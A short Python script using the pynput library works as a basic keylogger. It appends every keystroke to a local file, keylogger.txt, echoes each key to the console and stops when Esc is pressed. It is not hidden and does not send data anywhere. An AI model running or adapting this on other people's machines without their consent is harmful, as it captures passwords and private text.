from pynput import keyboard

log_file_path = 'keylogger.txt'

def on_press(key):
    with open(log_file_path, 'a') as log_file:
        try:
            print(f"The key that has been pressed is - {key.char}")
            log_file.write(key.char)
        except AttributeError:
            print(f"The key that has been pressed is - {key}")
            if key == keyboard.Key.space:
                log_file.write(' ')
            elif key == keyboard.Key.enter:
                log_file.write('\n')
            else:
                log_file.write(f'[{key.name}]')

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()